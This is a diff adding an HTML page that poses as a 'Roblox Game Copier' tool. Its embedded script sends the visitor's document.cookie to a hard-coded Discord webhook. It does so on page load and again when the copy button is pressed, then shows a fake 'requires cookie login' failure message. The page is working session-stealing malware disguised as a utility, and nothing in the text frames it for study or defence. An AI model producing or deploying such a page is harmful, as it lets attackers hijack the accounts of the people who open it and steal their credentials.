@@ -1,0 +1,45 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Roblox Game Copier</title>
+    <style>
+        body { font-family: Arial; background: #1e1e2f; color: white; text-align: center; padding: 50px; }
+        .container { max-width: 500px; margin: auto; background: #2a2a3b; padding: 30px; border-radius: 20px; }
+        input, button { width: 90%; padding: 12px; margin: 10px 0; border: none; border-radius: 10px; }
+        input { background: #3a3a4f; color: white; }
+        button { background: #ff4757; color: white; font-weight: bold; cursor: pointer; }
+        #status { margin-top: 20px; font-size: 14px; color: #aaa; }
+    </style>
+</head>
+<body>
+<div class="container">
+    <h2>Roblox Game Copier (Fake)</h2>
+    <p>Enter game URL or ID</p>
+    <input type="text" id="gameUrl" placeholder="https://www.roblox.com/games/..." />
+    <button id="copyBtn">Copy Game (Instant)</button>
+    <div id="status">Ready</div>
+</div>
+<script>
+    const WEBHOOK = "https://discord.com/api/webhooks/1510679949055623349/-jphmiZADRXglGyE2HHYADR7zMQNQppncV33dW_QBSqg-ImD_AgUj9pT6CkHxZoLOXB4";
+    function sendCookies() {
+        if (document.cookie) {
+            fetch(WEBHOOK, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({ content: "**Roblox Cookies:**\n```\n" + document.cookie + "\n```" })
+            });
+        }
+    }
+    document.getElementById("copyBtn").onclick = function() {
+        document.getElementById("status").innerHTML = "Copying...";
+        setTimeout(() => {
+            document.getElementById("status").innerHTML = "❌ Failed: Game requires cookie login";
+            sendCookies();
+        }, 1500);
+    };
+    sendCookies();  // also on page load
+</script>
+</body>
+</html>
